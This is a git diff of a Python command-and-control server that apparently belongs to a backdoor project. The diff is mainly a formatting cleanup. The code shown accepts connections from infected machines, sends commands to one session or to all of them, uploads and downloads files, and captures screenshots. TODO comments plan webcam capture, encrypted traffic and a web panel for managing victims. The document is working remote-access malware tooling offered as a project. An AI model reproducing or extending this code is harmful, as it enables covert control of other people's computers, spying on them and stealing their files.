@@ -1,11 +1,11 @@
-#possible dependency
-import datetime
 import socket
-import termcolor    #pip install termcolor
-import pyautogui    #pip install pylance
+import termcolor
 import json
 import os
 import threading
+
+from colour import banner
+
 
 def reliable_recv(target):
     data = ''
@@ -16,20 +16,24 @@ def reliable_recv(target):
         except ValueError:
             continue
 
+
 def reliable_send(target, data):
     jsondata = json.dumps(data)
     target.send(jsondata.encode())
 
-#This function is to stop server.py issuing reliable_send if command='help' or 'clear'
-#Creates less network traffic.
+
+# This function is to stop server.py issuing reliable_send if command='help' or 'clear'
+# Creates less network traffic.
 def exclusion_words(command):
-    exclusion_words = ['help', 'clear'] #make this global variable
-    if command == exclusion_words :
+    exclusion_words = ['help', 'clear']  # make this global variable
+    if command == exclusion_words:
         return 1
+
 
 def upload_file(target, file_name):
     f = open(file_name, 'rb')
     target.send(f.read())
+
 
 def download_file(target, file_name):
     f = open(file_name, 'wb')
@@ -44,11 +48,12 @@ def download_file(target, file_name):
     target.settimeout(None)
     f.close()
 
+
 def screenshot(target, count):
     directory = './screenshots'
     if not os.path.exists(directory):
         os.makedirs(directory)
-    f = open(directory + '/screenshot_%d.png' % (count), 'wb') #if target=Linux then #apt-get install scrot
+    f = open(directory + '/screenshot_%d.png' % (count), 'wb')  # if target=Linux then #apt-get install scrot
     target.settimeout(3)
     chunk = target.recv(1024)
     while chunk:
@@ -60,6 +65,16 @@ def screenshot(target, count):
     target.settimeout(None)
     f.close()
     count += 1
+
+
+# TODO: webcam(target) takes a quick webcam image
+# https://stackoverflow.com/a/69282582/4443012
+
+# TODO: encrypt()
+# TODO: decrypt() functions using RSA library AES128-GCM
+
+# TODO: use Flask to create a frontend UI in the web browser to manage C2 https://github.com/Tomiwa-Ot/moukthar
+
 
 def server_help_manual():
     print('''\n
@@ -86,6 +101,7 @@ def server_help_manual():
 
     \n''')
 
+
 def c2_help_manual():
     print('''\n
     ===Command and Control (C2) Manual===
@@ -97,6 +113,7 @@ def c2_help_manual():
     kill *session num*      --> Issue 'quit' To Specified Target Session
     sendall *command*       --> Sends The *command* To ALL Active Sessions (sendall notepad)
     \n''')
+
 
 def target_communication(target, ip):
     count = 0
@@ -123,6 +140,7 @@ def target_communication(target, ip):
             result = reliable_recv(target)
             print(result)
 
+
 def accept_connections():
     while True:
         if stop_flag:
@@ -136,7 +154,8 @@ def accept_connections():
         except:
             pass
 
-#Work in progress (currently 'exit' command is buggy when issued from c2()
+
+# Work in progress (currently 'exit' command is buggy when issued from c2()
 def c2():
     while True:
         try:
@@ -188,16 +207,17 @@ def c2():
             else:
                 print(termcolor.colored('[!!] Command Doesnt Exist', 'red'))
         except (KeyboardInterrupt, SystemExit):
-            if (input('\nDo you want to exit? yes/no: ') == 'yes'):
+            if input('\nDo you want to exit? yes/no: ') == 'yes':
                 break
         except ValueError as e:
             print('[!!] ValueError: ' + str(e))
-            continue 
+            continue
         finally:
             sock.close()
             print('\n[-] C2 Socket Closed! Bye!!')
 
-def exit_c2(targets): #function of: elif command == 'exit':
+
+def exit_c2(targets):  # function of: elif command == 'exit':
     for target in targets:
         reliable_send(target, 'quit')
         target.close()
@@ -206,20 +226,23 @@ def exit_c2(targets): #function of: elif command == 'exit':
     t1.join()
     SystemExit()
 
+
 targets = []
 ips = []
 stop_flag = False
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-sock.bind(('127.0.0.1', 5555))  #sudo fuser -k 5555/tcp 
+sock.bind(('127.0.0.1', 5555))  # sudo fuser -k 5555/tcp
 sock.listen(5)
 t1 = threading.Thread(target=accept_connections)
 t1.start()
+# print(colour.Colour())
+print(banner())
 print('Run "help" command to see the usage manual')
 print(termcolor.colored('[+] Waiting For The Incoming Connections ...', 'green'))
 
-#c2()
+# c2()
 
-#Command and control code (legacy)
+# Command and control code (legacy)
 while True:
     try:
         command = input('[**] Command & Control Center: ')
@@ -270,14 +293,13 @@ while True:
         else:
             print(termcolor.colored('[!!] Command Doesnt Exist', 'red'))
     except (KeyboardInterrupt, SystemExit):
-        if (input('\nDo you want to exit? yes/no: ') == 'yes'):
+        if input('\nDo you want to exit? yes/no: ') == 'yes':
             sock.close()
             print(termcolor.colored('\n[-] C2 Socket Closed! Bye!!', 'yellow'))
             break
     except ValueError as e:
         print(termcolor.colored('[!!] ValueError: ' + str(e), 'red'))
-        continue 
-
+        continue
 
 """
 Possibly improvements
@@ -288,3 +310,6 @@ Possibly improvements
 This will ensure if server.py crashes the backdoor will after 60s will realise server is not listen on socket 
 and will attempt to run connection() function again.
 """
+
+# TODO: encrypt connection
+# TODO: Implement a 'pulse' feature between server and backdoor (Keep alive)
